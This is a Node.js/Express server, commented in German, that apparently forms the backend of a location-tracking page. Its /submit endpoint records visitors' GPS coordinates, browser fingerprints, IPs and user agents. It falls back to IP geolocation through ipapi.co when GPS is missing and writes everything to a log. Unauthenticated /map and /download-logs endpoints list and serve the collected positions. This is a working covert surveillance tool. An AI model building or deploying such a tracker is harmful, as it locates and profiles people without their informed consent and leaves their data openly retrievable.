const cors = require('cors');

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const IV_LENGTH = 16;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY?.trim();

if (!ENCRYPTION_KEY || !/^[a-f0-9]{64}$/i.test(ENCRYPTION_KEY)) {
    throw new Error('❌ ENCRYPTION_KEY muss genau 64 hex-Zeichen (0-9,a-f) enthalten!');
}

function encrypt(text) {
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv(
            'aes-256-cbc',
            Buffer.from(ENCRYPTION_KEY, 'hex'),
            iv
        );
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (err) {
        console.error('🔴 Encryption-Fehler:', err);
        throw err;
    }
}

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');

// 🔥 2. CORS aktivieren (VOR ALLEN MIDDLEWARES)
app.use(cors()); // ⚠️ Für Produktion: app.use(cors({ origin: 'https://deine-domain.com' }))

if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR);
}

const rateLimit = require('express-rate-limit').default || require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    keyGenerator: (req) => {
        return req.headers['x-real-ip'] || req.ip;
    }
});

app.use('/submit', limiter);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// 📌 3. ANGEPASSTER /submit-ENDPOINT (MIT IP-FALLBACK)
app.post('/submit', limiter, async (req, res) => {
    try {
        let { latitude, longitude, method, fingerprint, extra } = req.body;
        const ip = req.headers['x-real-ip'] || req.ip;

        // 💀 IP-Geolocation als Fallback (wenn GPS fehlt)
        if ((!latitude || !longitude) && ip) {
            try {
                const ipData = await fetch(`https://ipapi.co/${ip}/json`).then(res => res.json());
                if (ipData.latitude && ipData.longitude) {
                    latitude = latitude || ipData.latitude;
                    longitude = longitude || ipData.longitude;
                    method = method ? `${method}+IP_FALLBACK` : 'IP_FALLBACK';
                    console.log('🌐 IP-Geolocation genutzt:', ipData.city);
                }
            } catch (ipError) {
                console.error('❌ IP-API Fehler:', ipError);
            }
        }

        const trackingData = {
            timestamp: new Date().toISOString(),
            ip: ip,
            userAgent: req.headers['user-agent'],
            method: method || 'UNKNOWN',
            coordinates: latitude && longitude ? {
                lat: parseFloat(latitude).toFixed(6),
                lng: parseFloat(longitude).toFixed(6),
                accuracy: extra?.accuracy || (method?.includes('IP') ? 5000 : null) // ⚠️ IP = 5km Genauigkeit
            } : null,
            fingerprint: fingerprint || null
        };

        console.log('📡 EMPFANGENE DATEN:', trackingData.method, trackingData.coordinates);

        fs.appendFileSync(
            path.join(LOG_DIR, 'tracking.log'),
            JSON.stringify(trackingData) + '\n'
        );

        if (process.env.RENDER) {
            fs.appendFileSync(
                path.join(LOG_DIR, 'backup.log'),
                encrypt(JSON.stringify(trackingData)) + '\n'
            );
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('❌ FEHLER:', error.message, req.body);
        res.status(500).json({ error: "Internal server error" });
    }
});

// 🗺️ KARTEN-ENDPOINT (GOOGLE MAPS LINKS)
app.get('/map', (req, res) => {
    try {
        const logs = fs.readFileSync(path.join(LOG_DIR, 'tracking.log'), 'utf-8')
            .split('\n')
            .filter(Boolean)
            .map(JSON.parse);
        
        const html = logs.map(log => 
            log.coordinates 
                ? `<a href="https://www.google.com/maps?q=${log.coordinates.lat},${log.coordinates.lng}" target="_blank">
                     ${log.timestamp} (Genauigkeit: ${log.coordinates.accuracy}m)
                   </a><br>`
                : ''
        ).join('');
        
        res.send(`<html><body>${html || 'Keine GPS-Daten gefunden'}</body></html>`);
    } catch (error) {
        res.status(500).send("Fehler beim Lesen der Logs");
    }
});

// 📥 LOG-DOWNLOAD
app.get('/download-logs', (req, res) => {
    try {
        const logFile = path.join(LOG_DIR, 'tracking.log');
        res.download(logFile, 'gps-tracker-logs.json');
    } catch (error) {
        res.status(500).send("Logs konnten nicht heruntergeladen werden.");
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server läuft auf Port ${PORT}`);
    console.log(`🔑 Encryption-Key: ${ENCRYPTION_KEY?.slice(0, 6)}...`);
    console.log('⚠️ CORS aktiviert für alle Domains (in Produktion einschränken!)');
});
